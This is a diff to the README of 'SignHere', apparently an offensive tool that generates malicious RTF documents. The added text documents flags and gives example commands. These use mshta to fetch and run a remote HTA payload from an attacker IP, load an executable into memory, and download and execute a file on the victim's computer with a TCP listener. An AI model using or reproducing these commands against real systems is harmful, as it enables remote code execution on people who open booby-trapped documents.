@@ -44,10 +44,31 @@ First, you need to download the [archive](https://github.com/Retr0-code/SignHere
 Argument with Windows command that will be executed after opening document.
 
 <b>--powershell</b>
-Argument with powershell command that will be in VBScript payload
+Argument with powershell command that will be in VBScript payload.
 
 <b>--ip</b>
-Argument with ip address that will be used for web-server
+Argument with ip address that will be used for web-server. (default: 127.0.0.1)
 
 <b>--output</b>
-Name and path of document
+Name and path of document.
+
+<br>
+
+```python
+./SignHere.py --cmd "mshta http://192.168.1.74/pay.hta" --temp exploit.exe --ip 192.168.1.74 --output generated.rtf
+```
+
+<b>--temp</b>
+Argument that will use binary file as payload (binary file will start in RAM memory).
+
+<br>
+
+```python
+./SignHere.py --cmd "mshta http://192.168.1.74/pay.hta" --payload exploit.exe --ip 192.168.1.74 --listener-host 192.168.1.74 --output generated.rtf
+```
+
+<b>--payload</b>
+Argument that will download file on computer of victim and execute it.
+
+<b>--listener-host</b>
+Argument for starting TCP listener on curret ip (default: 127.0.0.1)
